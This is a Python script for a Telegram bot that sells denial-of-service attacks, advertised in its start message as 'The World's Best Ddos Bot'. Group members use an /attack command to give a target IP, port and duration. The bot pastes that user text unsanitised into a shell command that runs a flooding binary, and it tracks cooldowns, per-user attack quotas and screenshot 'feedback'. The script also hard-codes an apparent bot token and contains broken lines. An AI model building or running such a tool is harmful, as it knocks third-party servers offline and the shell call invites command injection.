#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import aiohttp
import threading
import random
# Insert your Telegram bot token here
bot = telebot.TeleBot('7686606251:AAGgXXgK31YSmqjCdgI99ySGU5YC2xgfShQ')


# Admin user IDs
admin_id = ["1604629264"]

# Group and channel details
GROUP_ID = "-1002569945697"
GROUP_USERNAME = "@NXTLVLPUBLIC"
CHANNEL_USERNAME = "@nxtlvlthings"

# Default cooldown and attack limits
COOLDOWN_TIME = 80  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker

# 🎯 Random Image URLs  
video_urls = [
    "https://files.catbox.moe/pacadw.mp4",
    "https://files.catbox.moe/8k9zmt.mp4",
    "https://files.catbox.moe/1cskm1.mp4",
    "https://files.catbox.moe/xr9y6b.mp4",
    "https://files.catbox.moe/3honi0.mp4",
    "https://files.catbox.moe/xuhmq0.mp4",
    "https://files.catbox.moe/wjtilc.mp4",
    "https://files.catbox.moe/mit6r7.mp4",
    "https://files.catbox.moe/edaojm.mp4",
    "https://files.catbox.moe/cnc8j7.mp4",
    "https://files.catbox.moe/zr3nhn.mp4",
    "https://files.catbox.moe/o4lege.mp4",
    "https://files.catbox.moe/s6wgor.mp4",
    "https://files.catbox.moe/4kmo3m.mp4",
    "https://files.catbox.moe/em27tu.mp4"
]

def is_user_in_channel(user_id):
    return True  # **यहीं पर Telegram API से चेक कर सकते हो**
# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

pending_feedback = {}  # यूजर की स्क्रीनशॉट वेटिंग स्टेट स्टोर करने के लिए

# Track the pending attack status globally
global_pending_attack = None  # This will store user_id of the ongoing attack

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global global_last_attack_time, global_pending_attack
    
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f".•❅☁█▒░𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐘𝐄 𝐆𝐑𝐎𝐔𝐏 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀. 𝐉𝐎𝐈𝐍 -{GROUP_USERNAME}")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"𝐉𝐎𝐈𝐍 𝐊𝐑𝐎 𝐏𝐀𝐇𝐋𝐄 {CHANNEL_USERNAME} ░░░░✦╬═••")
        return

    # ✅ Check if the user has pending feedback
    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "☬𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐆𝐀𝐘𝐀 𝐍𝐀 ❦𝐀𝐁 𝐒𝐂𝐑𝐄𝐄𝐍 𝐒𝐇𝐎𝐓 ☬𝐃𝐄 𝐓𝐀𝐁 𝐀𝐆𝐋𝐀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐆𝐄𝐆𝐀 ☬")
        return

    if global_pending_attack:
        bot.reply_to(message, "⚠️ **╔═════¦✵𝐖𝐀𝐈𝐓 𝐊𝐑𝐋𝐄 𝐁𝐇𝐀𝐈 𝐄𝐓𝐍𝐈 𝐉𝐀𝐋𝐃𝐈 𝐇 𝐓𝐎 𝐏𝐀𝐈𝐃 𝐋𝐄𝐋𝐄✵¦═════╗! 🛑")
        return

    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f" .•❅•✬❆❆*𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 {remaining_time} 𝐁𝐀𝐁𝐘❤️*❆❆✬•❅•..")
        return

    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}

    user = user_data[user_id]
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"❌ You have reached your daily attack limit of {ATTACK_LIMIT}. Try again tomorrow.")
        return

    if len(command) != 4:
        bot.reply_to(message, "❌ ᴜsᴀɢᴇ ᴇʀʀᴏʀ: \n ✅ ᴘʟᴇᴀsᴇ ᴜsᴇ: \n /attack <TARGET> <PORT> <DURATION>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "Error: PORT and TIME must be integers.")
        return

    if time_duration > 150:
        time_duration = 150
        return

    full_command = f"./bgmi {target} {port} {time_duration} "
    
    remaining_attacks = ATTACK_LIMIT - user['attacks'] - 1
    random_video = random.choice(video_urls)

    bot.send_video(message.chat.id, random_video, 
                   caption=f"🚀  {user_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 `{target} : {port}`\n"
                           f"⏳ **{time_duration} seconds**\n"
                           f"⚡ 𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 {remaining_attacks} \n"
                           f"❤️ 𝙎𝙚𝙣𝙙 𝙔𝙤𝙪𝙧 𝙂𝙖𝙢𝙚 𝙎𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩 ❤️")

    # ✅ **Mark user as pending feedback**
    pending_feedback[user_id] = True  
    global_pending_attack = user_id  # Attack in progress

    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CallebotrocessError as e:
        bot.reply_to(message, f"❌ Error executing attack command: {e}")
        global_pending_attack = None  # Reset if error
        pending_feedback[user_id] = False  # Allow next attack if failed
        return

    threading.Thread(target=send_attack_finished, args=(message, user_name, target, port, time_duration, remaining_attacks)).start()

def send_attack_finished(message, user_name, target, port, time_duration, remaining_attacks):
    global global_last_attack_time, global_pending_attack
    
    # Send Attack Finished Notification
     random_video = random.choice(video_urls)
    bot.send_video(message.chat.id, random_video, 
                   caption=f"✅ **𝘼𝙩𝙩𝙖𝙘𝙠 𝙁𝙞𝙣𝙞𝙨𝙝𝙚𝙙** ✅\n"
                     f"🚀 Attack on `{target}:{port}` has finished.\n"
                     f"⏳ **Time:{time_duration} seconds**\n"
                     f"⚡ SEND FEEDBACK ⚡")

    # Start Cooldown
    global_last_attack_time = datetime.datetime.now()  # Update the last attack time
    cooldown_end_time = global_last_attack_time + datetime.timedelta(seconds=COOLDOWN_TIME)
    
    # Send Cooldown Start Notification
    cooldown_msg = bot.send_message(message.chat.id, 
                     f"⏳ **Cooldown Started: {COOLDOWN_TIME} Seconds Remaining...**")

    # Loop for cooldown duration and update message
    while datetime.datetime.now() < cooldown_end_time:
        remaining_cooldown = (cooldown_end_time - datetime.datetime.now()).seconds
        try:
            bot.edit_message_text(chat_id=message.chat.id, 
                                  message_id=cooldown_msg.message_id,
                                  text=f"⏳ **Cooldown Remaining: {remaining_cooldown} Seconds...**")
        except:
            pass
        time.sleep(1)

    # Notify Cooldown Over
    bot.send_message(message.chat.id, "🚀 **Cooldown Over! Now You Can Attack Again!**\n⚡ *Type /attack to start your next attack!*")
    
    # Reset pending attack flag to None
    global_pending_attack = None

    
@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"Global cooldown: {remaining_time} seconds remaining.")
    else:
        bot.reply_to(message, "No global cooldown. You can initiate an attack.")

# Command to check remaining attacks for a user
@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in user_data:
        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining for today.")
    else:
        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")

# Admin commands
@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /reset <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"Attack limit for user {user_id} has been reset.")
    else:
        bot.reply_to(message, f"No data found for user {user_id}.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return

    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"Cooldown time has been set to {COOLDOWN_TIME} seconds.")
    except ValueError:
        bot.reply_to(message, "Please provide a valid number of seconds.")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    user_list = "\n".join([f"User ID: {user_id}, Attacks Used: {data['attacks']}, Remaining: {ATTACK_LIMIT - data['attacks']}" 
                           for user_id, data in user_data.items()])
    bot.reply_to(message, f"User Summary:\n\n{user_list}")
    
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "•❈•❉•❊•₪₪₪𝐃𝐇𝐀𝐍𝐘𝐖𝐀𝐀𝐃 𝐀𝐏𝐊𝐀 𝐉𝐎 𝐀𝐀𝐏𝐍𝐄 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐃𝐈𝐘𝐀 𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐆𝐀 𝐒𝐊𝐓𝐄 𝐇𝐎  ₪₪₪•❃•❅•❆•")
        pending_feedback[user_id] = False  # Screenshot मिल गया, अब नया अटैक कर सकता है
    else:
        bot.reply_to(message, "❌ You are not required to submit a screenshot right now.")
        

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Your Home, Feel Free to Explore.\nThe World's Best Ddos Bot\nTo Use This Bot Join https://t.me/FEEDBACKDDOS247"
    bot.reply_to(message, response)

# Function to reset daily limits automatically
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

# Start auto-reset in a separate thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data on startup
load_users()


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(15)
        
        
     




